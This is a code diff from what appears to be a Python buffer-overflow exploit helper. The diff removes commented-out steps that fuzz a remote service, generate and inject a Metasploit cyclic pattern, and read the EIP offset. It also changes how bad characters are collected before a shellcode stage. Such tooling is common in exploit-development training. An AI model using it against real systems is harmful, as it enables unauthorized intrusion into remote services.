@@ -220,42 +220,6 @@ class Classic:
             else:
                 print("[!] Got from session OFFSET " + str(self.config.offset))
 
-            # _offset = System.input("[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")
-            #
-            # if (_offset != ""):
-            #     self.config.offset = int(_offset)
-            # else:
-            #     self.config.offset = 0
-            #
-            # if (self.config.overflow == 0 and self.config.offset == 0):
-            #     self.config.overflow = fuzzer_func(self.config.remoteip, self.config.remoteport, self.config.field, 100, 100)
-            #
-            #     print("!" * 100)
-            #     print("[*] Application crashed at %s bytes" % self.config.overflow)
-            #
-            # if (self.config.offset == 0 and self.config.overflow > 0):
-            #     print("[+] Generating pattern: msf-pattern_create -l %s" % self.config.overflow)
-            #
-            #     # print subprocess.check_output(['msf-pattern_create', '-l', str(crash)])
-            #     # python3
-            #     # result = subprocess.run(['msf_pattern-create', crash], stdout=subprocess.PIPE)
-            #     # result.stdout
-            #
-            #     buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.config.overflow)]).strip()
-            #
-            #     gonext = System.input("[?] Press ENTER when you wanna give the shot!!! This will send the PATTERN imediately!!!")
-            #
-            #     # print(buffer);
-            #
-            #     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
-            #     print("[+] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")
-            #     eip_address = System.input("[?] Check the target debugger and enter EIP Value :")
-            #
-            #     _offset = subprocess.check_output(['msf-pattern_offset', '-q', str(eip_address)])
-            #     _offset = _offset.split('offset ')
-            #
-            #     self.config.offset = int(_offset[len(_offset) - 1].strip())
-
             # if self.config.offset < 2:
             #     gonext = "n"
             #     while gonext == "n":
@@ -323,14 +287,16 @@ class Classic:
                 inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
 
             if(gonext != "S"):
-                bads = System.input("Additional Badchars? Separate multiple HEX (without 0x) by commas:")
+                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas :")
 
                 if ',' in bads:
                     _bads = bads.split(',')
                     for _badchar in _bads:
-                        self.config.badchars.append(r'\x' + _badchar)
+                        System.badchars.append(r'\x' + _badchar)
                 elif bads != "":
-                    self.config.badchars.append(r'\x' + bads)
+                    System.badchars.append(r'\x' + bads)
+
+            self.config.badchars = System.badchars
 
             #########################################################
             # SHELLCODE
